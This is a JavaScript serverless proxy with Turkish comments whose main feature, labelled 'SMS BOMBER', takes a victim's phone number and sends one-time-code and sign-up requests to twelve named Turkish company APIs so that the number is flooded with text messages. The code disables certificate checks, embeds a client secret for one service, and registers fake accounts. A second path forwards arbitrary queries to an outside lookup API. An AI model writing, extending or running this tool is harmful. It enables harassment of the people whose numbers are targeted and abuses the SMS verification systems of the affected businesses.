// api/proxy.js
const https = require('https');

// Modül yükleme hatalarını yakala
let axios;
try {
    axios = require('axios');
} catch (e) {
    module.exports = (req, res) => {
        res.status(500).json({ error: 'axios modülü yüklenemedi: ' + e.message });
    };
    return;
}

const agent = { 
    httpsAgent: new https.Agent({ rejectUnauthorized: false }), 
    timeout: 10000 // 8sn'den 10sn'ye çıkardık, yavaş servisler için
};

const rnd = (n = 8) => Array.from({ length: n }, () => 'abcdefghijklmnopqrstuvwxyz0123456789'[Math.floor(Math.random() * 36)]).join('');
const rnum = (n = 4) => Math.floor(Math.random() * Math.pow(10, n));
const phone0 = (p) => `0${p}`;
const phone90 = (p) => `90${p}`;

// Her servis fonksiyonunu güvenli hale getir
const services = {
    bim: async (p) => {
        await axios.post('https://bim.veesk.net/service/v1.0/account/login', { phone: phone90(p) }, agent);
        return true;
    },
    file: async (p) => {
        const r = await axios.post('https://api.filemarket.com.tr/v1/otp/send', { mobilePhoneNumber: phone90(p) }, agent);
        return r.data?.data === '200 OK';
    },
    aygaz: async (p) => {
        await axios.post('https://ecommerce-memberapi.aygaz.com.tr/api/Membership/SendVerificationCode', { Gsm: p }, agent);
        return true;
    },
    qumpara: async (p) => {
        await axios.post('https://tr-api.fisicek.com/v1.4/auth/getOTP', { msisdn: p }, agent);
        return true;
    },
    mopas: async (p) => {
        const tr = await axios.post(
            'https://api.mopas.com.tr//authorizationserver/oauth/token?client_id=mobile_mopas&client_secret=secret_mopas&grant_type=client_credentials',
            null, agent
        );
        if (!tr.data?.access_token) return false;
        await axios.get(
            `https://api.mopas.com.tr//mopaswebservices/v2/mopas/sms/sendSmsVerification?mobileNumber=${p}`,
            { ...agent, headers: { authorization: `${tr.data.token_type} ${tr.data.access_token}` } }
        );
        return true;
    },
    saka: async (p) => {
        const r = await axios.post('https://mobilcrm2.saka.com.tr/api/customer/login', { gsm: phone0(p) }, agent);
        return r.data?.status === 1;
    },
    gofody: async (p) => {
        const r = await axios.post('https://backend.gofody.com/api/v1/enduser/register/', { country_code: '90', phone: p }, agent);
        return r.data?.success === true;
    },
    scooby: async (p) => {
        await axios.get(`https://sct.scoobyturkiye.com/v1/mobile/user/code-request?phoneNumber=90${p}`, agent);
        return true;
    },
    pinar: async (p) => {
        const r = await axios.post(
            'https://pinarsumobileservice.yasar.com.tr/pinarsu-mobil/api/Customer/SendOtp',
            { MobilePhone: p },
            { ...agent, headers: { devicetype: 'android' } }
        );
        return String(r.data).toLowerCase() === 'true';
    },
    marti: async (p) => {
        const r = await axios.post(
            'https://customer.martiscooter.com/v13/scooter/dispatch/customer/signin',
            { mobilePhone: p, mobilePhoneCountryCode: '90' },
            agent
        );
        return r.data?.isSuccess === true;
    },
    karma: async (p) => {
        await axios.post('https://api.gokarma.app/v1/auth/send-sms', {
            phoneNumber: phone90(p), type: 'REGISTER', deviceId: rnd(16), language: 'tr-TR'
        }, agent);
        return true;
    },
    englishhome: async (p) => {
        await axios.post('https://www.englishhome.com:443/enh_app/users/registration/', {
            first_name: 'Test', last_name: 'Test', email: `t${rnum()}@gmail.com`,
            phone: phone0(p), password: 'Password123!', email_allowed: false, sms_allowed: false, confirm: true, tom_pay_allowed: true
        }, agent);
        return true;
    }
};

// Ana handler'ı tamamen try/catch içine al
module.exports = async (req, res) => {
    // CORS başlıkları
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    if (req.method === 'OPTIONS') return res.status(200).end();

    try {
        // req.query yoksa boş nesne kullan (çökme önlemi)
        const query = req.query || {};
        const { action, phone, endpoint, ...params } = query;

        // ─── SMS BOMBER ───
        if (action === 'smsbomber') {
            if (!phone) {
                return res.status(400).json({ error: 'Telefon numarası gerekli.' });
            }

            // Telefon numarası formatını doğrula (10 hane, sadece rakam)
            if (!/^\d{10}$/.test(phone)) {
                return res.status(400).json({ error: 'Telefon numarası 10 haneli olmalı (örn: 5551234567).' });
            }

            const results = [];
            // Her servisi ayrı ayrı dene, biri patlarsa diğerleri devam etsin
            for (const [name, fn] of Object.entries(services)) {
                try {
                    const success = await fn(phone);
                    results.push({ service: name, success, message: success ? 'Gönderildi' : 'Yanıt başarısız' });
                } catch (e) {
                    results.push({ service: name, success: false, message: e.message });
                }
            }

            const basarili = results.filter(r => r.success).length;
            return res.status(200).json({
                total: results.length,
                basarili,
                basarisiz: results.length - basarili,
                results
            });
        }

        // ─── STANDART SORGU ───
        if (!endpoint) {
            return res.status(400).json({ error: 'Endpoint belirtilmedi.' });
        }

        try {
            const response = await axios.get(`https://api.ajaxsystems.fun/${endpoint}`, {
                params: params,
                timeout: 9000
            });
            return res.status(200).json(response.data);
        } catch (error) {
            // API hatasını kullanıcıya düzgün mesajla dön
            return res.status(200).json({
                error: error.response?.data?.message || error.message || 'API isteği başarısız oldu.'
            });
        }

    } catch (globalError) {
        // En dıştaki hata yakalayıcı — Vercel'in çökmesini engeller
        console.error('[PROXY GLOBAL HATA]', globalError);
        return res.status(500).json({
            error: 'Sunucu hatası: ' + (globalError.message || 'Bilinmeyen hata')
        });
    }
};
